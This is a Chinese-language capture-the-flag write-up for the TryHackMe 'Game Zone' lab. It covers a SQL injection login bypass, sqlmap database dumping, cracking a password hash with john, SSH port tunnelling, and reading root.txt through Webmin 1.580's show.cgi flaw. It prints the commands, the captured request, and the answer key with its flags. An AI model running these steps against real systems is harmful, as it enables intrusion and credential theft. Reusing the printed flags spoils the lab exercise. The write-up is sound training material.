---
title: "Game Zone Writeup"
date: 2023-06-14
tags: [writeup, ctf, tryhackme]
description: "在 TryHackMe 的 Game Zone 房间中扫描并利用一个存在漏洞的 Web 论坛，成功拿到 shell 并完成提权。"
---

## 环境准备 

我们首先需要连接到 tryhackme 的 VPN 服务器。你可以通过访问 [Access](https://tryhackme.com/access) 页面获取更多相关信息。

我将使用 openvpn 连接到服务器。命令如下：

```
$ sudo openvpn --config NovusEdge.ovpn
```

## 信息收集

执行 `nmap` 扫描后可以看到以下信息：
```shell-session
$ sudo nmap -sS -Pn -vv --top-ports 2000 -oN nmap_scan.txt TARGET_IP 

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

访问 80 端口上的 http 服务，映入眼帘的是下面这个页面：
![](/assets/img/writeup_assets/game-zone/home-page.png)


> 论坛上拿着狙击枪的大型卡通头像叫什么名字？
>
> Answer: Agent 47

页面上有 2 个输入表单：一个是 `Site Search`，另一个是 `User Login`。我们可以输入一些 SQLi 字符串来测试是否存在数据库（SQL）注入漏洞：
![](/assets/img/writeup_assets/game-zone/sqli-simple-login.png)

成功登录服务后会跳转到以下页面：
![](/assets/img/writeup_assets/game-zone/portal-login-dash.png)

> 登录后，你被重定向到了哪个页面？
>
> Answer: `portal.php`

既然目标存在 SQLi 漏洞，我们现在就可以使用 SQLMap 进行进一步的信息收集了……


使用 Burpsuite 抓取浏览器在访问 `portal.php` 页面时发送的请求：
```http
POST /portal.php HTTP/1.1
Host: TARGET_IP
Content-Length: 14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://TARGET_IP
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://TARGET_IP/portal.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=kfd3hokcd5krmlmrofgs4q45q7
Connection: close

searchitem=asd
```

我们可以将其保存到文件中，然后传给 SQLMap 来认证用户会话：
```shell-session
$ sqlmap -r portal-request.txt --dbms=mysql --dump

...
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y

...

POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N

...

do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y

...

do you want to crack them via a dictionary-based attack? [Y/n/q] 

...

what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1

...

do you want to use common password suffixes? (slow!) [y/N] N

...
```

这样我们就拿到了用户 `agent47` 的密码哈希值。

> 在 users 表中，密码哈希值是什么？
>
> Answer: `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`

> 与该密码哈希值关联的用户名是什么？
>
> Answer: `agent47`

我们还获取了数据库 `db` 中名为 `post` 的表里的记录。

> 另一个表名是什么？
>
> Answer: `post`


既然已经拿到了 `agent47` 的密码哈希，我们就可以用 `john` 来爆破并获取该用户的明文密码了。
```shell-session
$ echo ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 > hash.txt

$ sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
...
videogamer124    (?)     
```

> 解密后的密码是什么？
>
> Answer: `videogamer124`

现在我们可以尝试使用凭据 `agent47:videogamer124` 通过 `ssh` 登录服务器了。

## 获取权限

使用信息收集阶段拿到的凭据，我们现在登录服务器的 ssh 服务。
```shell-session
$ ssh agent47@TARGET_IP
...
agent47@TARGET_IP's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$
```

现在我们可以拿到 user flag 了：
```shell-session
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c
```

> user flag 是什么？
>
> Answer: `649ac17b1480ac13ef1e4fa579dac95c`

检查目标机器上正在运行的 socket 连接：
```shell-session
Netid State      Recv-Q Send-Q                                               Local Address:Port                                                              Peer Address:Port               
udp   UNCONN     0      0                                                                *:10000                                                                        *:*                  
udp   UNCONN     0      0                                                                *:68                                                                           *:*                  
tcp   LISTEN     0      80                                                       127.0.0.1:3306                                                                         *:*                  
tcp   LISTEN     0      128                                                              *:10000                                                                        *:*                  
tcp   LISTEN     0      128                                                              *:22                                                                           *:*                  
tcp   LISTEN     0      128                                                             :::80                                                                          :::*                  
tcp   LISTEN     0      128                                                             :::22                                                                          :::*
```

> 有多少个 TCP socket 正在运行？
>
> Answer: 5

由于运行在 10000 端口上的服务被防火墙拦截了，我们可以建立一个 ssh 隧道把该端口映射到本地。
```shell-session
$ ssh -L 10000:localhost:10000 agent47@TARGET_IP
agent47@TARGET_IP's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Sun Nov 27 23:59:23 2022 from TARGET_IP
agent47@gamezone:~$
```

现在，我们可以用浏览器访问 `localhost:10000` 了：
![](/assets/img/writeup_assets/game-zone/localhost-10000.png)



> 暴露出来的 CMS 名称是什么？
>
> Answer: `Webmin`

使用凭据 `agent47:videogamer124`，我们可以登录该服务：
![](/assets/img/writeup_assets/game-zone/webmin-dash.png)

> CMS 的版本号是多少？
>
> Answer: `1.580`

## 权限提升

使用 `searchsploit`，我们现在可以找到一些针对 `Webmin 1.580` 的利用脚本：
```shell-session
$ searchsploit webmin 1.58     
-------------------------------------------------------- ---------------------------------
 Exploit Title                                          |  Path
-------------------------------------------------------- ---------------------------------
Webmin 1.580 - '/file/show.cgi' Remote Command Executio | unix/remote/21851.rb
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Discl | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Discl | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metas | linux/webapps/47330.rb
-------------------------------------------------------- ---------------------------------
Shellcodes: No Results


```

我们可以利用第二个 exploit 的逻辑。只需直接访问 `localhost:10000/file/show.cgi/root/root.txt`，就能读取 `root.txt` 文件的内容。

> root flag 是什么？
>
> Answer: `a4b945830144bdd71908d12d902adeee`

## 总结

如果这篇 writeup 对你有帮助，欢迎在 [github](https://github.com/NovusEdge) 上关注我，或者给项目仓库点个 star：https://github.com/NovusEdge/thm-writeups


- 房间：[Game Zone](https://tryhackme.com/room/gamezone)
